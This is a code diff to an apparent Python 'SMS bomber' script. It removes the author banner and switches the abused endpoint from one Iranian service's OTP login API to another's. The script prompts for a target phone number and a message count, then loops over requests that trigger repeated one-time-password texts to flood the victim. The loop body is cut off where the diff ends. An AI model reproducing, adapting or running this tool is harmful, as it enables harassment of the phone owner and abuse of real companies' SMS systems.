@@ -8,19 +8,13 @@ print(Fore.GREEN+'''
  `--. \ '_ ` _ \/ __||  _  | | | | '_ \| |/ _ \ '__|
 /\__/ / | | | | \__ \| | | | |_| | | | | |  __/ |   
 \____/|_| |_| |_|___/\_| |_/\__,_|_| |_\_/\___|_|   
-_________________________________________
-● Anonymous5840
-● Sms Bomber
-● My ID = Anonymous5840
-● TeAm = gray hat warning¿
-_________________________________________
 ''')
 
 phone=int(input(Fore.GREEN+"[ Phone targit ]"+Fore.RED+" =>" ))
 num =int(input(Fore.GREEN+"Number Sms"+Fore.RED+" =>" ))
 print(Fore.GREEN+"Start"+Fore.RED+"..")
-url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
-data ={"cellphone": phone}
+url="https://ws.alibaba.ir/api/v3/account/mobile/otp"
+data ={"phoneNumber": phone}
 for i in range(0,num):
     req.session()
     time.sleep(2)
